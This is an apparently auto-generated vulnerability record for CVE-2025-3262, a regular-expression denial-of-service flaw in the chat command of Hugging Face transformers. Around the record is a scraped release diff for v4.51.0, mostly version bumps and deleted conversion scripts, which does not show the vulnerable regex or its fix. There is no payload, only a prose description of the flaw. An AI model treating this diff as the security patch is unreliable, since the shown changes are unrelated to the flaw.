 delete mode 100644 src/transformers/models/wavlm/convert_wavlm_original_s3prl_checkpoint_to_pytorch.py
 delete mode 100755 src/transformers/models/whisper/convert_openai_to_hf.py
 delete mode 100644 src/transformers/models/x_clip/convert_x_clip_original_pytorch_to_hf.py
 delete mode 100644 src/transformers/models/xglm/convert_xglm_original_ckpt_to_trfms.py
 delete mode 100755 src/transformers/models/xlm/convert_xlm_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/xlm_roberta_xl/convert_xlm_roberta_xl_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100755 src/transformers/models/xlnet/convert_xlnet_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/xmod/convert_xmod_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/yolos/convert_yolos_to_pytorch.py
 delete mode 100644 src/transformers/models/yoso/convert_yoso_pytorch_to_pytorch.py
 delete mode 100644 src/transformers/models/zoedepth/convert_zoedepth_to_hf.py

diff --git a/examples/flax/question-answering/run_qa.py b/examples/flax/question-answering/run_qa.py
index c42911f6638d..63d9c918cc44 100644
--- a/examples/flax/question-answering/run_qa.py
+++ b/examples/flax/question-answering/run_qa.py
@@ -61,7 +61,7 @@
 logger = logging.getLogger(__name__)
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 Array = Any
 Dataset = datasets.arrow_dataset.Dataset
diff --git a/examples/flax/speech-recognition/run_flax_speech_recognition_seq2seq.py b/examples/flax/speech-recognition/run_flax_speech_recognition_seq2seq.py
index 6028f7408bad..38258ecec303 100644
--- a/examples/flax/speech-recognition/run_flax_speech_recognition_seq2seq.py
+++ b/examples/flax/speech-recognition/run_flax_speech_recognition_seq2seq.py
@@ -60,7 +60,7 @@
 
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risk.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=2.14.0", "To fix: pip install -r examples/flax/speech-recognition/requirements.txt")
 
diff --git a/examples/flax/text-classification/run_flax_glue.py b/examples/flax/text-classification/run_flax_glue.py
index 522a601551da..a3d952a1a2bb 100755
--- a/examples/flax/text-classification/run_flax_glue.py
+++ b/examples/flax/text-classification/run_flax_glue.py
@@ -56,7 +56,7 @@
 
 logger = logging.getLogger(__name__)
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 Array = Any
 Dataset = datasets.arrow_dataset.Dataset
diff --git a/examples/flax/token-classification/run_flax_ner.py b/examples/flax/token-classification/run_flax_ner.py
index 5c8fa77cbb93..4b232115c0d4 100644
--- a/examples/flax/token-classification/run_flax_ner.py
+++ b/examples/flax/token-classification/run_flax_ner.py
@@ -57,7 +57,7 @@
 
 logger = logging.getLogger(__name__)
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=1.8.0", "To fix: pip install -r examples/pytorch/token-classification/requirements.txt")
 
diff --git a/examples/pytorch/audio-classification/run_audio_classification.py b/examples/pytorch/audio-classification/run_audio_classification.py
index 5d1e0390f61d..89915308a1e0 100644
--- a/examples/pytorch/audio-classification/run_audio_classification.py
+++ b/examples/pytorch/audio-classification/run_audio_classification.py
@@ -45,7 +45,7 @@
 logger = logging.getLogger(__name__)
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=1.14.0", "To fix: pip install -r examples/pytorch/audio-classification/requirements.txt")
 
diff --git a/examples/pytorch/contrastive-image-text/run_clip.py b/examples/pytorch/contrastive-image-text/run_clip.py
index 232c58c417a1..bdd803e646b4 100644
--- a/examples/pytorch/contrastive-image-text/run_clip.py
+++ b/examples/pytorch/contrastive-image-text/run_clip.py
@@ -54,7 +54,7 @@
 logger = logging.getLogger(__name__)
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=1.8.0", "To fix: pip install -r examples/pytorch/contrastive-image-text/requirements.txt")
 
diff --git a/examples/pytorch/image-classification/run_image_classification.py b/examples/pytorch/image-classification/run_image_classification.py
index c941465babe0..c0d2001b9bea 100755
--- a/examples/pytorch/image-classification/run_image_classification.py
+++ b/examples/pytorch/image-classification/run_image_classification.py
@@ -57,7 +57,7 @@
 logger = logging.getLogger(__name__)
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=2.14.0", "To fix: pip install -r examples/pytorch/image-classification/requirements.txt")
 
diff --git a/examples/pytorch/image-classification/run_image_classification_no_trainer.py b/examples/pytorch/image-classification/run_image_classification_no_trainer.py
index 564588a52b8b..d837440405ba 100644
--- a/examples/pytorch/image-classification/run_image_classification_no_trainer.py
+++ b/examples/pytorch/image-classification/run_image_classification_no_trainer.py
@@ -49,7 +49,7 @@
 
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 logger = get_logger(__name__)
 
diff --git a/examples/pytorch/image-pretraining/run_mae.py b/examples/pytorch/image-pretraining/run_mae.py
index fdffbda0beea..208c43c2b4e6 100644
--- a/examples/pytorch/image-pretraining/run_mae.py
+++ b/examples/pytorch/image-pretraining/run_mae.py
@@ -43,7 +43,7 @@
 logger = logging.getLogger(__name__)
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=1.8.0", "To fix: pip install -r examples/pytorch/image-pretraining/requirements.txt")
 
diff --git a/examples/pytorch/image-pretraining/run_mim.py b/examples/pytorch/image-pretraining/run_mim.py
index 3f497252d3a6..c0ae1cec1c1d 100644
--- a/examples/pytorch/image-pretraining/run_mim.py
+++ b/examples/pytorch/image-pretraining/run_mim.py
@@ -48,7 +48,7 @@
 logger = logging.getLogger(__name__)
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=1.8.0", "To fix: pip install -r examples/pytorch/image-pretraining/requirements.txt")
 
diff --git a/examples/pytorch/image-pretraining/run_mim_no_trainer.py b/examples/pytorch/image-pretraining/run_mim_no_trainer.py
index 5935ce438478..c60787764c24 100644
--- a/examples/pytorch/image-pretraining/run_mim_no_trainer.py
+++ b/examples/pytorch/image-pretraining/run_mim_no_trainer.py
@@ -53,7 +53,7 @@
 logger = logging.getLogger(__name__)
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=1.8.0", "To fix: pip install -r examples/pytorch/image-pretraining/requirements.txt")
 
diff --git a/examples/pytorch/instance-segmentation/run_instance_segmentation.py b/examples/pytorch/instance-segmentation/run_instance_segmentation.py
index 6229c6f36583..6cb6859fd976 100644
--- a/examples/pytorch/instance-segmentation/run_instance_segmentation.py
+++ b/examples/pytorch/instance-segmentation/run_instance_segmentation.py
@@ -46,7 +46,7 @@
 logger = logging.getLogger(__name__)
 
 # Will error if the minimal version of Transformers is not installed. Remove at your own risks.
-check_min_version("4.51.0.dev0")
+check_min_version("4.51.0")
 
 require_version("datasets>=2.0.0", "To fix: pip install -r examples/pytorch/inst
... [truncated]

================================================================================


CVE ID: CVE-2025-3262
Published: 2025-07-07T10:15:27.200
Modified: 2025-08-02T01:20:02.673
CVSS Score: 7.5 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

CWE Categories:
  - CWE-1333: CWE-1333

Description:
A Regular Expression Denial of Service (ReDoS) vulnerability was discovered in the huggingface/transformers repository, specifically in version 4.49.0. The vulnerability is due to inefficient regular expression complexity in the `SETTING_RE` variable within the `transformers/commands/chat.py` file. The regex contains repetition groups and non-optimized quantifiers, leading to exponential backtracking when processing 'almost matching' payloads. This can degrade application performance and potentially result in a denial-of-service (DoS) when handling specially crafted input strings. The issue is fixed in version 4.51.0.

References (3):
  1. https://github.com/huggingface/transformers/commit/0720e206c6ba28887e4d60ef60a6a089f6c1cc76 [Patch]
  2. https://huntr.com/bounties/ecf5ccc4-39e7-4fb3-b547-14a41d31a184 [Exploit, Third Party Advisory]
  3. https://huntr.com/bounties/ecf5ccc4-39e7-4fb3-b547-14a41d31a184 [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/huggingface/transformers/commit/0720e206c6ba28887e4d60ef60a6a089f6c1cc76 ---
From 0720e206c6ba28887e4d60ef60a6a089f6c1cc76 Mon Sep 17 00:00:00 2001
From: Lysandre <hi@lysand.re>
Date: Sat, 5 Apr 2025 22:03:17 +0200
Subject: [PATCH] Release: v4.51.0

---
 examples/flax/question-answering/run_qa.py    |    2 +-
 .../run_flax_speech_recognition_seq2seq.py    |    2 +-
 .../flax/text-classification/run_flax_glue.py |    2 +-
 .../flax/token-classification/run_flax_ner.py |    2 +-
 .../run_audio_classification.py               |    2 +-
 .../contrastive-image-text/run_clip.py        |    2 +-
 .../run_image_classification.py               |    2 +-
 .../run_image_classification_no_trainer.py    |    2 +-
 examples/pytorch/image-pretraining/run_mae.py |    2 +-
 examples/pytorch/image-pretraining/run_mim.py |    2 +-
 .../image-pretraining/run_mim_no_trainer.py   |    2 +-
 .../run_instance_segmentation.py              |    2 +-
 .../run_instance_segmentation_no_trainer.py   |    2 +-
 examples/pytorch/language-modeling/run_clm.py |    2 +-
 .../language-modeling/run_clm_no_trainer.py   |    2 +-
 examples/pytorch/language-modeling/run_fim.py |    2 +-
 .../language-modeling/run_fim_no_trainer.py   |    2 +-
 examples/pytorch/language-modeling/run_mlm.py |    2 +-
 .../language-modeling/run_mlm_no_trainer.py   |    2 +-
 examples/pytorch/language-modeling/run_plm.py |    2 +-
 examples/pytorch/multiple-choice/run_swag.py  |    2 +-
 .../multiple-choice/run_swag_no_trainer.py    |    2 +-
 .../object-detection/run_object_detection.py  |    2 +-
 .../run_object_detection_no_trainer.py        |    2 +-
 examples/pytorch/question-answering/run_qa.py |    2 +-
 .../question-answering/run_qa_beam_search.py  |    2 +-
 .../run_qa_beam_search_no_trainer.py          |    2 +-
 .../question-answering/run_qa_no_trainer.py   |    2 +-
 .../question-answering/run_seq2seq_qa.py      |    2 +-
 .../run_semantic_segmentation.py              |    2 +-
 .../run_semantic_segmentation_no_trainer.py   |    2 +-
 .../run_speech_recognition_ctc.py             |    2 +-
 .../run_speech_recognition_ctc_adapter.py     |    2 +-
 .../run_speech_recognition_seq2seq.py         |    2 +-
 .../summarization/run_summarization.py        |    2 +-
 .../run_summarization_no_trainer.py           |    2 +-
 .../text-classification/run_classification.py |    2 +-
 .../pytorch/text-classification/run_glue.py   |    2 +-
 .../run_glue_no_trainer.py                    |    2 +-
 .../pytorch/text-classification/run_xnli.py   |    2 +-
 .../pytorch/token-classification/run_ner.py   |    2 +-
 .../run_ner_no_trainer.py                     |    2 +-
 .../pytorch/translation/run_translation.py    |    2 +-
 .../translation/run_translation_no_trainer.py |    2 +-
 .../contrastive-image-text/run_clip.py        |    2 +-
 .../run_image_classification.py               |    2 +-
 .../tensorflow/multiple-choice/run_swag.py    |    2 +-
 .../tensorflow/question-answering/run_qa.py   |    2 +-
 .../summarization/run_summarization.py        |    2 +-
 .../text-classification/run_glue.py           |    2 +-
 .../tensorflow/translation/run_translation.py |    2 +-
 setup.py                                      |    2 +-
 src/transformers/__init__.py                  |    2 +-
 ...lbert_original_tf_checkpoint_to_pytorch.py |   62 -
 .../models/align/convert_align_tf_to_hf.py    |  389 -----
 .../models/aria/convert_aria_weights_to_hf.py |  162 --
 ...trogram_transformer_original_to_pytorch.py |  279 ----
 .../bamba/convert_mamba_ssm_checkpoint.py     |  273 ----
 .../models/bark/convert_suno_to_hf.py         |  263 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  156 --
 .../beit/convert_beit_unilm_to_pytorch.py     |  373 -----
 ...bert_original_tf2_checkpoint_to_pytorch.py |  246 ---
 ..._bert_original_tf_checkpoint_to_pytorch.py |   62 -
 ..._bert_pytorch_checkpoint_to_original_tf.py |  112 --
 ...ping_original_tf2_checkpoint_to_pytorch.py |  188 ---
 ...gbird_original_tf_checkpoint_to_pytorch.py |   69 -
 .../convert_bigbird_pegasus_tf_to_pytorch.py  |  170 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  292 ----
 .../models/bit/convert_bit_to_pytorch.py      |  177 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  114 --
 .../convert_blip_original_pytorch_to_hf.py    |  191 ---
 .../convert_blip_2_original_to_pytorch.py     |  390 -----
 ...rt_bloom_original_checkpoint_to_pytorch.py |  254 ----
 .../models/bros/convert_bros_to_pytorch.py    |  145 --
 ..._byt5_original_tf_checkpoint_to_pytorch.py |   59 -
 ...anine_original_tf_checkpoint_to_pytorch.py |   65 -
 .../convert_chameleon_weights_to_hf.py        |  476 ------
 ...ert_chinese_clip_original_pytorch_to_hf.py |  134 --
 .../convert_clap_original_pytorch_to_hf.py    |  133 --
 .../convert_clip_original_pytorch_to_hf.py    |  156 --
 .../convert_clipseg_original_pytorch_to_hf.py |  264 ----
 .../models/clvp/convert_clvp_to_hf.py         |  234 ---
 .../colpali/convert_colpali_weights_to_hf.py  |  214 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  324 ----
 ...ginal_tf1_checkpoint_to_pytorch_and_tf2.py |   57 -
 .../convnext/convert_convnext_to_pytorch.py   |  242 ---
 .../convert_convnextv2_to_pytorch.py          |  286 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  362 -----
 ..._original_pytorch_checkpoint_to_pytorch.py |  233 ---
 .../models/dac/convert_dac_checkpoint.py      |  261 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  285 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  207 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  374 -----
 .../convert_deformable_detr_to_pytorch.py     |  236 ---
 .../deit/convert_deit_timm_to_pytorch.py      |  218 ---
 ...original_gluonnlp_checkpoint_to_pytorch.py |  318 ----
 .../deta/convert_deta_resnet_to_pytorch.py    |  319 ----
 .../deta/convert_deta_swin_to_pytorch.py      |  326 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  252 ----
 ...convert_gptsan_tf_checkpoint_to_pytorch.py |  181 ---
 .../deprecated/jukebox/convert_jukebox.py     |  279 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  292 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |   70 -
 ...fo_xl_original_tf_checkpoint_to_pytorch.py |  121 --
 .../deprecated/van/convert_van_to_pytorch.py  |  290 ----
 .../convert_vit_hybrid_timm_to_pytorch.py     |  282 ----
 .../convert_depth_anything_to_hf.py           |  368 -----
 .../convert_distill_any_depth_to_hf.py        |  246 ---
 .../convert_depth_pro_weights_to_hf.py        |  254 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  277 ----
 .../models/detr/convert_detr_to_pytorch.py    |  385 -----
 ..._original_pytorch_checkpoint_to_pytorch.py |   46 -
 .../models/dinov2/convert_dinov2_to_hf.py     |  285 ----
 .../convert_dinov2_with_registers_to_hf.py    |  291 ----
 .../dit/convert_dit_unilm_to_pytorch.py       |  230 ---
 .../models/donut/convert_donut_to_pytorch.py  |  234 ---
 ...vert_dpr_original_checkpoint_to_pytorch.py |  143 --
 .../models/dpt/convert_dinov2_depth_to_hf.py  |  383 -----
 .../models/dpt/convert_dpt_beit_to_hf.py      |  305 ----
 .../dpt/convert_dpt_hybrid_to_pytorch.py      |  315 ----
 .../models/dpt/convert_dpt_swinv2_to_hf.py    |  321 ----
 .../models/dpt/convert_dpt_to_pytorch.py      |  285 ----
 .../convert_efficientnet_to_pytorch.py        |  339 -----
 ...ectra_original_tf_checkpoint_to_pytorch.py |   79 -
 .../models/emu3/convert_emu3_weights_to_hf.py |  448 ------
 .../convert_encodec_checkpoint_to_pytorch.py  |  365 -----
 src/transformers/models/esm/convert_esm.py    |  399 -----
 .../falcon/convert_custom_code_checkpoint.py  |   74 -
 ..._original_pytorch_checkpoint_to_pytorch.py |  210 ---
 .../fastspeech2_conformer/convert_hifigan.py  |  134 --
 .../convert_model_with_hifigan.py             |  102 --
 .../flava/convert_dalle_to_flava_codebook.py  |  102 --
 .../convert_flava_original_pytorch_to_hf.py   |   99 --
 ...net_original_flax_checkpoint_to_pytorch.py |  156 --
 .../focalnet/convert_focalnet_to_hf_format.py |  237 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  280 ----
 ...unnel_original_tf_checkpoint_to_pytorch.py |   67 -
 .../fuyu/convert_fuyu_model_weights_to_hf.py  |  134 --
 .../gemma/convert_gemma_weights_to_hf.py      |  206 ---
 .../gemma2/convert_gemma2_weights_to_hf.py    |  239 ---
 .../convert_gemma3_weights_orbax_to_hf.py     |  589 --------
 .../models/git/convert_git_to_pytorch.py      |  448 ------
 .../models/glm/convert_glm_weights_to_hf.py   |  195 ---
 .../models/glpn/convert_glpn_to_pytorch.py    |  218 ---
 .../convert_got_ocr2_weights_to_hf.py         |  274 ----
 ..._gpt2_original_tf_checkpoint_to_pytorch.py |   68 -
 .../convert_gpt_neo_mesh_tf_to_pytorch.py     |   71 -
 .../gpt_sw3/convert_megatron_to_pytorch.py    |  197 ---
 .../convert_grounding_dino_to_hf.py           |  491 ------
 .../groupvit/convert_groupvit_nvlab_to_hf.py  |  217 ---
 .../models/hiera/convert_hiera_to_hf.py       |  369 -----
 ...rt_original_s3prl_checkpoint_to_pytorch.py |  222 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  261 ----
 ...rt_original_s3prl_checkpoint_to_pytorch.py |   68 -
 .../convert_idefics2_weights_to_hf.py         |  185 ---
 .../convert_idefics3_weights_to_hf.py         |  214 ---
 .../models/ijepa/convert_ijepa_to_hf.py       |  267 ----
 ...onvert_imagegpt_original_tf2_to_pytorch.py |   71 -
 ...onvert_instructblip_original_to_pytorch.py |  303 ----
 ...t_instructblipvideo_original_to_pytorch.py |  305 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |   77 -
 .../levit/convert_levit_timm_to_pytorch.py    |  181 ---
 .../llama/convert_llama_weights_to_hf.py      |  601 --------
 .../llama4/convert_llama4_weights_to_hf.py    |  736 ---------
 .../llava/convert_llava_weights_to_hf.py      |  204 ---
 .../convert_llava_next_weights_to_hf.py       |  397 -----
 .../convert_llava_next_video_weights_to_hf.py |  276 ----
 .../convert_llava_onevision_weights_to_hf.py  |  388 -----
 ...r_original_pytorch_lightning_to_pytorch.py |   85 --
 .../convert_longt5x_checkpoint_to_flax.py     |  215 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  170 ---
 ...xmert_original_tf_checkpoint_to_pytorch.py |   59 -
 ...t_m2m100_original_checkpoint_to_pytorch.py |   85 --
 ...convert_mamba_ssm_checkpoint_to_pytorch.py |  153 --
 ...onvert_mamba2_ssm_checkpoint_to_pytorch.py |  193 ---
 .../convert_marian_tatoeba_to_pytorch.py      | 1327 -----------------
 .../marian/convert_marian_to_pytorch.py       |  717 ---------
 ..._original_pytorch_checkpoint_to_pytorch.py | 1019 -------------
 ..._original_pytorch_checkpoint_to_pytorch.py |  731 ---------
 .../convert_maskformer_resnet_to_pytorch.py   |  390 -----
 .../convert_maskformer_swin_to_pytorch.py     |  333 -----
 ...rt_mbart_original_checkpoint_to_pytorch.py |   83 --
 .../convert_megatron_bert_checkpoint.py       |  334 -----
 .../convert_megatron_gpt2_checkpoint.py       |  358 -----
 .../convert_mimi_checkpoint_to_pytorch.py     |  198 ---
 .../mistral/convert_mistral_weights_to_hf.py  |  282 ----
 .../convert_mistral3_weights_to_hf.py         |  241 ---
 .../mixtral/convert_mixtral_weights_to_hf.py  |  244 ---
 .../mllama/convert_mllama_weights_to_hf.py    |  639 --------
 ..._original_pytorch_checkpoint_to_pytorch.py |  229 ---
 ...ebert_original_tf_checkpoint_to_pytorch.py |   58 -
 ...nvert_original_tf_checkpoint_to_pytorch.py |  141 --
 ...nvert_original_tf_checkpoint_to_pytorch.py |  177 ---
 .../mobilevit/convert_mlcvnets_to_pytorch.py  |  311 ----
 .../convert_mlcvnets_to_pytorch.py            |  332 -----
 .../moonshine/convert_usefulsensors_to_hf.py  |  169 ---
 .../moshi/convert_moshi_transformers.py       |  311 ----
 .../mra/convert_mra_pytorch_to_pytorch.py     |  110 --
 .../musicgen/convert_musicgen_transformers.py |  236 ---
 .../convert_musicgen_melody_transformers.py   |  267 ----
 ..._myt5_original_tf_checkpoint_to_pytorch.py |   60 -
 .../nemotron/convert_nemotron_nemo_to_hf.py   |  346 -----
 ..._sharded_original_checkpoint_to_pytorch.py |  161 --
 .../models/nougat/convert_nougat_to_hf.py     |  282 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  111 --
 .../models/olmo/convert_olmo_weights_to_hf.py |  248 ---
 .../olmo2/convert_olmo2_weights_to_hf.py      |  306 ----
 .../olmoe/convert_olmoe_weights_to_hf.py      |  281 ----
 .../omdet_turbo/convert_omdet_turbo_to_hf.py  |  349 -----
 .../oneformer/convert_to_hf_oneformer.py      | 1191 ---------------
 ...penai_original_tf_checkpoint_to_pytorch.py |   74 -
 ..._original_pytorch_checkpoint_to_pytorch.py |  113 --
 .../models/owlv2/convert_owlv2_to_hf.py       |  422 ------
 .../convert_owlvit_original_flax_to_hf.py     |  406 -----
 .../convert_paligemma2_weights_to_hf.py       |  415 ------
 .../convert_paligemma_weights_to_hf.py        |  347 -----
 .../pegasus/convert_pegasus_tf_to_pytorch.py  |  131 --
 .../convert_perceiver_haiku_to_pytorch.py     |  468 ------
 .../convert_persimmon_weights_to_hf.py        |  129 --
 .../models/phi/convert_phi_weights_to_hf.py   |  207 ---
 .../convert_phi4_multimodal_weights_to_hf.py  |  229 ---
 ...nvert_pix2struct_original_pytorch_to_hf.py |  155 --
 .../pixtral/convert_pixtral_weights_to_hf.py  |  246 ---
 ...ert_plbart_original_checkpoint_to_torch.py |   94 --
 .../convert_poolformer_original_to_pytorch.py |  214 ---
 .../convert_pop2piano_weights_to_hf.py        |  190 ---
 .../convert_prompt_depth_anything_to_hf.py    |  292 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  159 --
 .../models/pvt/convert_pvt_to_pytorch.py      |  226 ---
 .../pvt_v2/convert_pvt_v2_to_pytorch.py       |  294 ----
 .../convert_recurrent_gemma_to_hf.py          |  222 ---
 ...ert_reformer_trax_checkpoint_to_pytorch.py |  226 ---
 .../convert_regnet_seer_10b_to_pytorch.py     |  308 ----
 .../regnet/convert_regnet_to_pytorch.py       |  458 ------
 ...onvert_rembert_tf_checkpoint_to_pytorch.py |   62 -
 .../resnet/convert_resnet_to_pytorch.py       |  199 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  177 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |   77 -
 ...ormer_original_tf_checkpoint_to_pytorch.py |   62 -
 ..._detr_original_pytorch_checkpoint_to_hf.py |  782 ----------
 .../convert_rt_detr_v2_weights_to_hf.py       |  363 -----
 .../rwkv/convert_rwkv_checkpoint_to_hf.py     |  209 ---
 .../models/sam/convert_sam_to_hf.py           |  251 ----
 .../seamless_m4t/convert_fairseq2_to_hf.py    |  396 -----
 .../seamless_m4t_v2/convert_fairseq2_to_hf.py |  404 -----
 .../convert_segformer_original_to_pytorch.py  |  387 -----
 .../models/seggpt/convert_seggpt_to_hf.py     |  221 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  305 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  317 ----
 ...onvert_shieldgemma2_weights_orbax_to_hf.py |  470 ------
 .../models/siglip/convert_siglip_to_hf.py     |  533 -------
 .../models/siglip2/convert_siglip2_to_hf.py   |  438 ------
 ...rt_wav2vec2_seq2seq_original_to_pytorch.py |  357 -----
 ...xt_wav2vec2_seq2seq_original_to_pytorch.py |  316 ----
 .../convert_s2t_fairseq_to_tfms.py            |  121 --
 .../models/speecht5/convert_hifigan.py        |  108 --
 ..._original_pytorch_checkpoint_to_pytorch.py |  401 -----
 .../superglue/convert_superglue_to_hf.py      |  342 -----
 .../convert_superpoint_to_pytorch.py          |  175 ---
 .../convert_swiftformer_original_to_hf.py     |  175 ---
 .../swin/convert_swin_simmim_to_pytorch.py    |  182 ---
 .../swin/convert_swin_timm_to_pytorch.py      |  173 ---
 .../convert_swin2sr_original_to_pytorch.py    |  278 ----
 .../swinv2/convert_swinv2_timm_to_pytorch.py  |  219 ---
 .../switch_transformers/convert_big_switch.py |  194 ---
 ...ers_original_flax_checkpoint_to_pytorch.py |  203 ---
 ...rt_t5_original_tf_checkpoint_to_pytorch.py |   59 -
 .../t5/convert_t5x_checkpoint_to_flax.py      |  235 ---
 .../t5/convert_t5x_checkpoint_to_pytorch.py   |  238 ---
 .../convert_table_transformer_to_hf.py        |  317 ----
 ...convert_table_transformer_to_hf_no_timm.py |  434 ------
 ...tapas_original_tf_checkpoint_to_pytorch.py |  137 --
 .../models/textnet/convert_textnet_to_hf.py   |  208 ---
 .../convert_timesformer_to_pytorch.py         |  253 ----
 .../trocr/convert_trocr_unilm_to_pytorch.py   |  237 ---
 .../models/udop/convert_udop_to_hf.py         |  224 ---
 .../convert_umt5_checkpoint_to_pytorch.py     |  274 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  273 ----
 ...ch_original_s3prl_checkpoint_to_pytorch.py |  109 --
 ..._original_pytorch_checkpoint_to_pytorch.py |  224 ---
 .../models/univnet/convert_univnet.py         |  162 --
 .../convert_convnext_upernet_to_pytorch.py    |  214 ---
 .../convert_swin_upernet_to_pytorch.py        |  297 ----
 .../convert_video_llava_weights_to_hf.py      |  159 --
 .../videomae/convert_videomae_to_pytorch.py   |  324 ----
 .../vilt/convert_vilt_original_to_pytorch.py  |  299 ----
 .../convert_vipllava_weights_to_hf.py         |  132 --
 ..._original_pytorch_checkpoint_to_pytorch.py |  149 --
 .../models/vit/convert_dino_to_pytorch.py     |  218 ---
 .../models/vit/convert_vit_timm_to_pytorch.py |  254 ----
 .../vit_mae/convert_vit_mae_to_pytorch.py     |  178 ---
 .../models/vit_msn/convert_msn_to_pytorch.py  |  245 ---
 .../models/vitmatte/convert_vitmatte_to_hf.py |  170 ---
 .../models/vitpose/convert_vitpose_to_hf.py   |  428 ------
 .../vits/convert_original_checkpoint.py       |  390 -----
 .../vivit/convert_vivit_flax_to_pytorch.py    |  231 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  385 -----
 ...c2_original_s3prl_checkpoint_to_pytorch.py |  109 --
 .../convert_wav2vec2_seamless_checkpoint.py   |  217 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  309 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  206 ---
 ...lm_original_s3prl_checkpoint_to_pytorch.py |  109 --
 .../models/whisper/convert_openai_to_hf.py    |  370 -----
 .../convert_x_clip_original_pytorch_to_hf.py  |  386 -----
 .../convert_xglm_original_ckpt_to_trfms.py    |   68 -
 ..._original_pytorch_checkpoint_to_pytorch.py |   77 -
 ..._original_pytorch_checkpoint_to_pytorch.py |  183 ---
 ...xlnet_original_tf_checkpoint_to_pytorch.py |  113 --
 ..._original_pytorch_checkpoint_to_pytorch.py |  212 ---
 .../models/yolos/convert_yolos_to_pytorch.py  |  267 ----
 .../yoso/convert_yoso_pytorch_to_pytorch.py   |  108 --
 .../models/zoedepth/convert_zoedepth_to_hf.py |  426 ------
 312 files changed, 53 insertions(+), 66972 deletions(-)
 delete mode 100644 src/transformers/models/albert/convert_albert_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/align/convert_align_tf_to_hf.py
 delete mode 100644 src/transformers/models/aria/convert_aria_weights_to_hf.py
 delete mode 100644 src/transformers/models/audio_spectrogram_transformer/convert_audio_spectrogram_transformer_original_to_pytorch.py
 delete mode 100644 src/transformers/models/bamba/convert_mamba_ssm_checkpoint.py
 delete mode 100644 src/transformers/models/bark/convert_suno_to_hf.py
 delete mode 100644 src/transformers/models/bart/convert_bart_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/beit/convert_beit_unilm_to_pytorch.py
 delete mode 100644 src/transformers/models/bert/convert_bert_original_tf2_checkpoint_to_pytorch.py
 delete mode 100755 src/transformers/models/bert/convert_bert_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/bert/convert_bert_pytorch_checkpoint_to_original_tf.py
 delete mode 100644 src/transformers/models/bert/convert_bert_token_dropping_original_tf2_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/big_bird/convert_bigbird_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/bigbird_pegasus/convert_bigbird_pegasus_tf_to_pytorch.py
 delete mode 100755 src/transformers/models/biogpt/convert_biogpt_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/bit/convert_bit_to_pytorch.py
 delete mode 100644 src/transformers/models/blenderbot/convert_blenderbot_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/blip/convert_blip_original_pytorch_to_hf.py
 delete mode 100644 src/transformers/models/blip_2/convert_blip_2_original_to_pytorch.py
 delete mode 100644 src/transformers/models/bloom/convert_bloom_original_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/bros/convert_bros_to_pytorch.py
